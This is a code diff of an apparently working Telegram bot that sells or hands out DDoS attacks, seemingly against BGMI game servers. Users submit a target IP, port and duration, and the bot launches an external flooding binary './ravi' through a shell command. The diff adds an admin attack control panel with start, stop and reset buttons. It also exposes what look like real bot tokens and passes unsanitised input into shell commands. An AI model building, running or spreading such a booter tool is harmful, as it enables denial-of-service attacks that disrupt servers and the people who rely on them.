@@ -5,14 +5,20 @@ import time
 import subprocess
 import threading
 from telebot import types
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import subproces
 
+is_attack_running = False
+attack_process = None
+target_ip = None
+target_port = None
 # TELEGRAM BOT TOKEN
-bot = telebot.TeleBot('8064557178:AAG578KnVSWvoz5eigBuQQwVTfYuLi5LPTU')
+bot = telebot.TeleBot('7733619497:AAEs3jGmgMlCJfuwFI8Cuc9qd_5VJfKud_s')
 
 # GROUP AND CHANNEL DETAILS
-GROUP_ID = "-1001855389923"
-CHANNEL_USERNAME = "@KHAPITAR_BALAK77", "@CLouD_VIP_CHEAT"
-SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77", "@CLouD_VIP_CHEAT"
+GROUP_ID = "-1002369239894"
+CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
+SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
 ADMINS = [7129010361]
 
 # GLOBAL VARIABLES
@@ -22,29 +28,99 @@ pending_feedback = {}
 warn_count = {}
 attack_logs = []
 user_attack_count = {}
+attack_process = None
+target_ip = None
+target_port = None
 
 # FUNCTION TO CHECK IF USER IS IN CHANNEL
 def is_user_in_channel(user_id):
     try:
-        for channel in CHANNEL_USERNAME:
-            member = bot.get_chat_member(channel, user_id)
-            if member.status not in ['member', 'administrator', 'creator']:
-                return False  # Agar kisi bhi channel me nahi hai toh False
-        return True  # Dono channels me hai toh True
+        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
+        return member.status in ['member', 'administrator', 'creator']
     except:
         return False
 
 # SCREENSHOT VERIFICATION FUNCTION
 def verify_screenshot(user_id, message):
     if user_id in pending_feedback:
-        for channel in SCREENSHOT_CHANNEL:
-            bot.forward_message(channel, message.chat.id, message.message_id)  # Screenshot dono channels me bhej raha hai
-            bot.send_message(channel, f"📸 **𝗨𝗦𝗘𝗥 `{user_id}` 𝗞𝗔 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!** ✅")
-        
-        bot.reply_to(message, "✅ SCREENSHOT VERIFIED!. 🚀")
+        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
+        bot.send_message(SCREENSHOT_CHANNEL, f"📸 **𝗨𝗦𝗘𝗥 `{user_id}` 𝗞𝗔 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!** ✅")
+        bot.reply_to(message, "✅ 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗠𝗜𝗟 𝗚𝗔𝗬𝗔! 𝗔𝗕 𝗧𝗨 𝗡𝗔𝗬𝗔 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗚𝗔 𝗦𝗔𝗞𝗧𝗔 𝗛𝗔𝗜. 🚀")
         del pending_feedback[user_id]  
     else:
-        bot.reply_to(message, "❌❌❌ NO PANDING!")
+        bot.reply_to(message, "❌ 𝗔𝗕 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗕𝗛𝗘𝗝𝗡𝗘 𝗞𝗜 𝗭𝗔𝗥𝗢𝗢𝗥𝗔𝗧 𝗡𝗔𝗛𝗜 𝗛𝗔𝗜!")
+
+@bot.message_handler(commands=['attack'])
+def set_target(message):
+    global target_ip, target_port
+
+    if message.from_user.id not in ADMINS:
+        bot.reply_to(message, "❌ Sirf admin set kar sakta hai!")
+        return
+
+    parts = message.text.split()
+    if len(parts) != 3:
+        bot.reply_to(message, "⚠️ Format: /settarget <IP> <PORT>")
+        return
+
+    target_ip = parts[1]
+    try:
+        target_port = int(parts[2])
+    except ValueError:
+        bot.reply_to(message, "❌ Port number galat hai!")
+        return
+
+    bot.send_message(message.chat.id, f"🎯 Target set: `{target_ip}:{target_port}`", parse_mode="Markdown")
+    show_attack_panel(message)
+
+def show_attack_panel(message):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("🟢 START ATTACK", callback_data="start"),
+        InlineKeyboardButton("🔴 STOP ATTACK", callback_data="stop"),
+        InlineKeyboardButton("⚫ RESET ATTACK", callback_data="reset")
+    )
+    bot.send_message(message.chat.id, "⚙️ Attack Control Panel", reply_markup=keyboard)
+
+@bot.callback_query_handler(func=lambda call: True)
+def handle_buttons(call):
+    global is_attack_running, attack_process, target_ip, target_port
+
+    if call.from_user.id not in ADMINS:
+        bot.answer_callback_query(call.id, "❌ Sirf admin use kar sakta hai!", show_alert=True)
+        return
+
+    if call.data == "start":
+        if not target_ip or not target_port:
+            bot.answer_callback_query(call.id, "⚠️ Target set nahi hai!", show_alert=True)
+            return
+
+        if is_attack_running:
+            bot.answer_callback_query(call.id, "⚠️ Attack already chalu hai!")
+            return
+
+        try:
+            attack_process = subprocess.Popen(f"./ravi {target_ip} {target_port} 0 600", shell=True)
+            is_attack_running = True
+            bot.answer_callback_query(call.id, "✅ Attack chalu ho gaya!")
+        except Exception as e:
+            bot.answer_callback_query(call.id, f"❌ Failed: {e}")
+
+    elif call.data == "stop":
+        if is_attack_running and attack_process:
+            attack_process.terminate()
+            attack_process = None
+            is_attack_running = False
+            bot.answer_callback_query(call.id, "⛔ Attack band kar diya!")
+        else:
+            bot.answer_callback_query(call.id, "⚠️ Koi attack chalu nahi hai!")
+
+    elif call.data == "reset":
+        is_attack_running = False
+        attack_process = None
+        target_ip = None
+        target_port = None
+        bot.answer_callback_query(call.id, "✅ Target aur attack reset ho gaya!")
 
 # HANDLE ATTACK COMMAND
 @bot.message_handler(commands=['bgmi'])
@@ -58,7 +134,7 @@ def handle_attack(message):
         return
 
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❌ 𝗣𝗘𝗛𝗟𝗘 𝗗𝗢𝗡𝗢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟𝗦 𝗝𝗢𝗜𝗡 𝗞𝗔𝗥𝗢! {', '.join(CHANNEL_USERNAME)}")
+        bot.reply_to(message, f" 𝗣𝗘𝗛𝗟𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗝𝗢𝗜𝗡 𝗞𝗔𝗥!{CHANNEL_USERNAME}")
         return
 
     if pending_feedback.get(user_id, False):
@@ -82,8 +158,8 @@ def handle_attack(message):
         bot.reply_to(message, "❌ 𝗣𝗢𝗥𝗧 𝗔𝗨𝗥 𝗧𝗜𝗠𝗘 𝗡𝗨𝗠𝗕𝗘𝗥 𝗛𝗢𝗡𝗘 𝗖𝗛𝗔𝗛𝗜𝗬𝗘!")
         return
 
-    if time_duration > 180:
-        bot.reply_to(message, "🚫 180𝙎 𝙎𝙀 𝙕𝙔𝘼𝘿𝘼 𝘼𝙇𝙇𝙊𝙒𝙀𝘿 𝙉𝘼𝙃𝙄 𝙃𝘼𝙄!")
+    if time_duration > 100:
+        bot.reply_to(message, "🚫 100𝙎 𝙎𝙀 𝙕𝙔𝘼𝘿𝘼 𝘼𝙇𝙇𝙊𝙒𝙀𝘿 𝙉𝘼𝙃𝙄 𝙃𝘼𝙄!")
         return
 
     confirm_msg = f"🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n🎯 𝗧𝗔𝗥𝗚𝗘𝗧: `{target}`\n🔢 𝗣𝗢𝗥𝗧: `{port}`\n⏳ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡: `{time_duration}S`\n𝗦𝗧𝗔𝗧𝗨𝗦: `𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗔 𝗛𝗔𝗜𝗡...`\n📸 𝗔𝗧𝗧𝗔𝗖𝗞 𝗞𝗘 𝗕𝗔𝗔𝗗 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗕𝗛𝗘𝗝𝗡𝗔 𝗭𝗔𝗥𝗢𝗢𝗥𝗜 𝗛𝗔𝗜!"
@@ -101,7 +177,7 @@ def handle_attack(message):
 
     # Attack Execution
     try:
-        subprocess.run(f"./ravi {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
+        subprocess.run(f"./ravi {target} {port} {time_duration} 500", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
         bot.reply_to(message, "❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘𝗢𝗨𝗧 𝗛𝗢 𝗚𝗔𝗬𝗔! 🚨")
     except subprocess.CalledProcessError:
